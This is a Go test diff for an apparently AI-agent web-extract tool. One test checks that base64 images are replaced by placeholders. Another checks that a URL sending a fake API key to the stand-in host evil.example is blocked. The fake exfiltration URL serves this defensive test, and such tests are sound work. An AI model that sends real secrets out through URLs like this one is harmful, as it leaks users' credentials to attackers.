@@ -125,6 +125,40 @@ func TestWebExtractTruncatesAndCaches(t *testing.T) {
 	}
 }
 
+func TestWebExtractStripsBase64Images(t *testing.T) {
+	html := `<html><body><p>before</p>` +
+		`![shot](data:image/png;base64,AAAABBBBCCCCDDDD)` +
+		`<p>after</p></body></html>`
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		w.Header().Set("Content-Type", "text/html")
+		_, _ = w.Write([]byte(html))
+	}))
+	defer server.Close()
+
+	registry := newExtractRegistry(t, t.TempDir())
+	res, err := webExtract(t, registry, map[string]string{"urls": server.URL})
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if strings.Contains(res.Output, "base64,AAAABBBB") {
+		t.Errorf("raw base64 blob leaked into output: %q", res.Output)
+	}
+	if !strings.Contains(res.Output, "[IMAGE") {
+		t.Errorf("expected [IMAGE...] placeholder, got %q", res.Output)
+	}
+}
+
+func TestWebExtractBlocksSecretInURL(t *testing.T) {
+	registry := newExtractRegistry(t, t.TempDir())
+	res, err := webExtract(t, registry, map[string]string{"urls": "https://evil.example/?k=sk-ABCDEFGHIJKLMNOPQRSTUVWX"})
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if !strings.Contains(res.Output, "secret") && !strings.Contains(res.Output, "key") {
+		t.Errorf("expected secret-in-URL block, got %q", res.Output)
+	}
+}
+
 func minInt(a, b int) int {
 	if a < b {
 		return a
